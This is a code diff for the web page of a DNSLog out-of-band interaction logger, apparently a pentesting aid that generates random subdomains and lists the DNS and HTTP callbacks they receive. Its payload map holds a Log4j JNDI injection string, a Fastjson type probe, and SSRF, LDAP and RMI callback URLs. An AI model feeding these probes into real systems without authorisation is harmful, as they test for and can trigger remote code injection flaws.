@@ -1,189 +1,304 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DNSLog</title>
-    <meta name="keywords" content="dnslog"/>
-    <meta name="description" content="dnslog"/>
+    <meta name="keywords" content="dnslog">
+    <meta name="description" content="dnslog">
     <script src="../js/vue.js"></script>
     <script src="../js/axios.min.js"></script>
+    <style>
+        #myRecords {
+            table-layout: fixed;
+        }
+
+        #myRecords td {
+            text-align: center;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        #myRecords .type-cell {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        #myRecords td:first-child {
+            max-width: 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        #myRecords td:first-child:hover {
+            white-space: normal;
+            word-break: break-all;
+            overflow: visible;
+        }
+
+        #myRecords thead th:nth-child(1) { width: 40%; }
+        #myRecords thead th:nth-child(2) { width: 10%; }
+        #myRecords thead th:nth-child(3) { width: 15%; }
+        #myRecords thead th:nth-child(4) { width: 20%; }
+        #myRecords thead th:nth-child(5) { width: 15%; }
+    </style>
 </head>
 <body>
-<div id=header style="text-align:center">
-    <hr style=" height:2px;border:none;border-top:2px dashed #87CEFA;"/>
+<header id="header" style="text-align:center">
+    <hr style="height:2px; border:none; border-top:2px dashed #87CEFA;">
     <br>
-</div>
-<div style="text-align:center;" id="app">
-    <button type="button" v-on:click="GetDomain">刷新记录</button>
-    <button type="button" v-on:click="GenPayload">复制随机子域名</button>
-    <button type="button" v-on:click="Clean">清空</button>
+</header>
+
+<main style="text-align:center;" id="app">
+    <button type="button" @click="getDnsData">刷新记录</button>
+    <button type="button" @click="generatePayload">复制随机子域名</button>
+    <button type="button" @click="clearRecords">清空</button>
     <br><br>
+
     <div id="myDomain">{{ randDomain }}</div>
-    <template v-if="randDomain !== ''" v-for="(item,key) in payload">
-        <div>{{key}}: <code>{{item.replace("domain", randDomain)}}</code></div>
+
+    <template v-if="randDomain !== ''" v-for="(item, key) in payload">
+        <div :key="key">{{ key }}: <code>{{ item.replace("domain", randDomain) }}</code></div>
     </template>
+
     <br>
-    <center>
-        <table id="myRecords" width=50% border="0" cellpadding="5" cellspacing="1" bgcolor="#EFF3FF"
-               style="word-break:break-all; word-wrap:break-all;">
-            <tr bgcolor="#ADD3EF">
-                <th align="center">DNS Query Record</th>
-                <th align="center">Type</th>
-                <th align="center">IP Address</th>
-                <th align="center">IP Location</th>
-                <th align="center">Created Time</th>
+    <div style="display: flex; justify-content: center;">
+        <table id="myRecords" style="width: 50%; border: 0; border-collapse: collapse; word-break: break-all; word-wrap: break-all; background-color: #EFF3FF;">
+            <thead>
+            <tr style="background-color: #ADD3EF;">
+                <th style="padding: 5px; text-align: center;">DNS Query Record</th>
+                <th style="padding: 5px; text-align: center;">Type</th>
+                <th style="padding: 5px; text-align: center;">IP Address</th>
+                <th style="padding: 5px; text-align: center;">IP Location</th>
+                <th style="padding: 5px; text-align: center;">Created Time</th>
             </tr>
-            <td v-if="DnsData == ''" colspan="3" align="center">No Data</td>
-            <tr v-for="item in DnsData">
-                <td align="center">{{ item.Subdomain }}</td>
-                <td align="center">{{ item.Type }}</td>
-                <td align="center">{{ item.Ipaddress }}</td>
-                <td align="center">{{ item.IpLocation }}</td>
-                <td align="center">{{ item.Time }}</td>
+            </thead>
+            <tbody>
+            <tr v-if="!dnsRecords || dnsRecords.length === 0">
+                <td colspan="5" style="padding: 5px; text-align: center;">No Data</td>
             </tr>
+
+            <template v-for="(item, index) in dnsRecords">
+                <tr :key="'record-' + index">
+                    <td style="padding: 5px; text-align: center;">
+                        {{ item.Subdomain }}
+                        <a v-if="item.Type && item.Type.toUpperCase() === 'HTTP'"
+                           href="#"
+                           @click.prevent="toggleRequest(index)"
+                           style="font-size: 10px; color: #007bff; text-decoration: none; margin-left: 5px;">
+                            [{{ item.showReq ? '收起' : '报文' }}]
+                        </a>
+                    </td>
+                    <td style="padding: 5px; text-align: center;">{{ item.Type }}</td>
+                    <td style="padding: 5px; text-align: center;">{{ item.Ipaddress }}</td>
+                    <td style="padding: 5px; text-align: center;">{{ item.IpLocation }}</td>
+                    <td style="padding: 5px; text-align: center;">{{ item.Time }}</td>
+                </tr>
+                <tr v-if="item.showReq && item.Type && item.Type.toUpperCase() === 'HTTP'"
+                    :key="'detail-' + index"
+                    style="background-color: #F0F7FF;">
+                    <td colspan="5" style="padding: 10px; text-align: left;">
+                        <div style="color: #666; font-size: 12px; margin-bottom: 3px;">HTTP Request:</div>
+                        <pre style="margin: 0; white-space: pre-wrap; word-break: break-all; font-family: monospace; font-size: 12px; background: #fff; border: 1px solid #D1E7FE; padding: 5px;">{{ item.Request }}</pre>
+                    </td>
+                </tr>
+            </template>
+            </tbody>
         </table>
+    </div>
+</main>
 
-    </center>
-</div>
-</body>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<div id=footer>
-    <hr style=" height:2px;border:none;border-top:2px dashed #87CEFA;"/>
+<br><br><br><br><br><br>
+
+<footer id="footer">
+    <hr style="height:2px; border:none; border-top:2px dashed #87CEFA;">
     <br>
-    <center><span style="color:#ADD3EF">DNSLog</span></center>
-</div>
-<script>
-    function formatTimeToStr(date) {
-        date = date * 1000
-        date = new Date(date)
-        var fmt = "mm-dd HH:MM:SS"
-        let ret;
-        const opt = {
-            "Y+": date.getFullYear().toString(),        // 年
-            "m+": (date.getMonth() + 1).toString(),     // 月
-            "d+": date.getDate().toString(),            // 日
-            "H+": date.getHours().toString(),           // 时
-            "M+": date.getMinutes().toString(),         // 分
-            "S+": date.getSeconds().toString()          // 秒
-            // 有其他格式化字符需求可以继续添加，必须转化成字符串
-        };
-        for (let k in opt) {
-            ret = new RegExp("(" + k + ")").exec(fmt);
-            if (ret) {
-                fmt = fmt.replace(ret[1], (ret[1].length == 1) ? (opt[k]) : (opt[k].padStart(ret[1].length, "0")))
-            }
-            ;
-        }
-        ;
-        return fmt;
-    }
+    <div style="text-align: center;"><span style="color:#ADD3EF">DNSLog</span></div>
+</footer>
 
-    function randomStr() {
-        const chars = 'abcdefhijkmnprstwxyz1234567890';
-        let randStr = "";
-        for (i = 0; i < 5; i++) {
-            randStr += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return randStr
-    }
-</script>
 <script>
-    var app = new Vue({
+    const formatTimeToStr = (ts) => {
+        const date = new Date(ts * 1000);
+        const pad = (n) => n.toString().padStart(2, '0');
+        return `${pad(date.getMonth() + 1)}-${pad(date.getDate())} ${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
+    };
+
+    const randomStr = () => {
+        const chars = 'abcdefhijkmnprstwxyz1234567890';
+        return Array.from({ length: 5 }, () =>
+            chars.charAt(Math.floor(Math.random() * chars.length))
+        ).join('');
+    };
+
+    const copyToClipboard = async (text) => {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            try {
+                await navigator.clipboard.writeText(text);
+                return true;
+            } catch (err) {
+                console.warn('Clipboard API failed, falling back to execCommand');
+            }
+        }
+
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.style.position = 'fixed';
+        textarea.style.opacity = '0';
+        document.body.appendChild(textarea);
+        textarea.select();
+        const success = document.execCommand('copy');
+        document.body.removeChild(textarea);
+        return success;
+    };
+
+    new Vue({
         el: '#app',
         data: {
-            DnsData: "",
-            Token: "",
-            domain: "",
-            randDomain: "",
+            dnsRecords: [],
+            token: '',
+            domain: '',
+            randDomain: '',
             payload: {
-                "Log4j": "${jndi:ldap://domain:9999/aaa}",
-                "Fastjson": '{"@type":"java.net.Inet4Address","val":"domain"}',
-                "SSRF": "",
+                'Log4j': '${jndi:ldap://domain:9999/aaa}',
+                'Fastjson': '{"@type":"java.net.Inet4Address","val":"domain"}',
+                'SSRF': '',
             },
+            refreshTimer: null,
+            recordsMap: new Map()
         },
         methods: {
-            GetDomain: function () {
-                axios.get("/api/getDnsData", {
-                    headers: {
-                        'token': this.Token
-                    }
-                }).then(
-                    res => {
-                        console.log(res.data);
-                        if (res.data.code !== 200) {
-                            alert("token错误");
-                            localStorage.clear();
-                            location.reload()
-                            return
-                        }
-                        console.log(res['data'])
-                        if (res['data']['data'].length > 0) {
-                            // let DnsData = JSON.parse(res['data']['data']).reverse();
-                            for (let i = 0; i < res['data']['data'].length; i++) {
-                                res['data']['data'][i].Time = formatTimeToStr(res['data']['data'][i].Time)
-                            }
-                            this.DnsData = res['data']['data']
-                        } else {
-                            this.DnsData = ""
-                        }
-                    }
-                )
-            },
-            Clean: function () {
-                axios.get("/api/clean", {
-                    headers: {
-                        'token': this.Token
-                    }
-                }).then()
-                this.DnsData = ""
-            },
-            GenPayload: function () {
-                let randDomain = randomStr() + "." + this.domain;
-                let domUrl = document.createElement("input");
-                domUrl.value = randDomain;
-                domUrl.id = "creatDom";
-                document.body.appendChild(domUrl);
-                domUrl.select(); // 选择对象
-                document.execCommand("Copy"); // 执行浏览器复制命令
-                let creatDom = document.getElementById("creatDom");
-                creatDom.parentNode.removeChild(creatDom);
-                let subdomain = this.domain.split(".")[0]
-                this.payload["SSRF"] = location.protocol + "//" + location.host + "/" + subdomain + "/"
-                this.payload["LDAP"] = 'ldap://' + location.host + '/' + subdomain
-                this.payload["RMI"] = 'rmi://' + location.host + '/' + subdomain
-                app.randDomain = randDomain
-                alert("复制成功");
-            }
-        },
-        mounted() {
-            let token;
-            if (localStorage.getItem("token") == null) {
-                token = prompt("请输入Token")
-                let data = {"token": token};
-                axios.post("/api/verifyToken", data)
-                    .then(res => {
-                        if (res.data.code === 200) {
-                            this.Token = token
-                            localStorage.setItem("token", token);
-                            this.domain = res.data.data.subdomain;
-                            localStorage.setItem("domain", this.domain);
-                        } else {
-                            alert("token错误")
-                            location.reload()
-                        }
-                    })
-            } else {
-                this.Token = localStorage.getItem("token")
-                this.domain = localStorage.getItem("domain")
-            }
-        },
-    });
-    setInterval("app.GetDomain()", 3000);
-</script>
+            toggleRequest(index) {
+                const record = this.dnsRecords[index];
+                const formattedTime = record.Time;
+                const key = `${record.Subdomain}-${formattedTime}`;
 
+                // 切换状态
+                const newShowReq = !record.showReq;
+
+                // 更新 Map 中的状态
+                this.recordsMap.set(key, newShowReq);
+
+                // 更新当前记录的状态
+                this.$set(this.dnsRecords[index], 'showReq', newShowReq);
+            },
+
+            async getDnsData() {
+                try {
+                    const res = await axios.get('/api/getDnsData', {
+                        headers: { 'token': this.token }
+                    });
+
+                    if (res.data.code !== 200) {
+                        alert('token错误');
+                        localStorage.clear();
+                        location.reload();
+                        return;
+                    }
+
+                    if (res.data.data && res.data.data.length > 0) {
+                        this.dnsRecords = res.data.data.map(item => {
+                            const formattedTime = typeof item.Time === 'number'
+                                ? formatTimeToStr(item.Time)
+                                : item.Time;
+
+                            const key = `${item.Subdomain}-${formattedTime}`;
+
+                            // 保持原有的展开状态
+                            const showReq = this.recordsMap.get(key) ?? false;
+
+                            return {
+                                ...item,
+                                Time: formattedTime,
+                                showReq
+                            };
+                        });
+                    } else {
+                        this.dnsRecords = [];
+                        this.recordsMap.clear();
+                    }
+                } catch (err) {
+                    console.error('获取DNS数据失败:', err);
+                }
+            },
+
+            async clearRecords() {
+                try {
+                    await axios.get('/api/clean', {
+                        headers: { 'token': this.token }
+                    });
+                    this.dnsRecords = [];
+                    this.recordsMap.clear();
+                } catch (err) {
+                    console.error('清空记录失败:', err);
+                }
+            },
+
+            async generatePayload() {
+                const randDomain = randomStr() + '.' + this.domain;
+
+                const success = await copyToClipboard(randDomain);
+
+                if (success) {
+                    const subdomain = this.domain.split('.')[0];
+                    this.payload['SSRF'] = `${location.protocol}//${location.host}/${subdomain}/`;
+                    this.payload['LDAP'] = `ldap://${location.host}/${subdomain}`;
+                    this.payload['RMI'] = `rmi://${location.host}/${subdomain}`;
+                    this.randDomain = randDomain;
+                    alert('复制成功');
+                } else {
+                    alert('复制失败，请手动复制');
+                }
+            },
+
+            async verifyToken(token) {
+                try {
+                    const res = await axios.post('/api/verifyToken', { token });
+                    if (res.data.code === 200) {
+                        this.token = token;
+                        localStorage.setItem('token', token);
+                        this.domain = res.data.data.subdomain;
+                        localStorage.setItem('domain', this.domain);
+                        await this.getDnsData();
+                    } else {
+                        alert('token错误');
+                        location.reload();
+                    }
+                } catch (err) {
+                    console.error('验证token失败:', err);
+                    alert('验证失败，请重试');
+                }
+            }
+        },
+
+        async mounted() {
+            const savedToken = localStorage.getItem('token');
+            const savedDomain = localStorage.getItem('domain');
+
+            if (!savedToken) {
+                const token = prompt('请输入Token');
+                if (token) {
+                    await this.verifyToken(token);
+                }
+            } else {
+                this.token = savedToken;
+                this.domain = savedDomain;
+                await this.getDnsData();
+            }
+
+            this.refreshTimer = setInterval(() => {
+                this.getDnsData();
+            }, 3000);
+        },
+
+        beforeDestroy() {
+            if (this.refreshTimer) {
+                clearInterval(this.refreshTimer);
+            }
+        }
+    });
+</script>
+</body>
 </html>
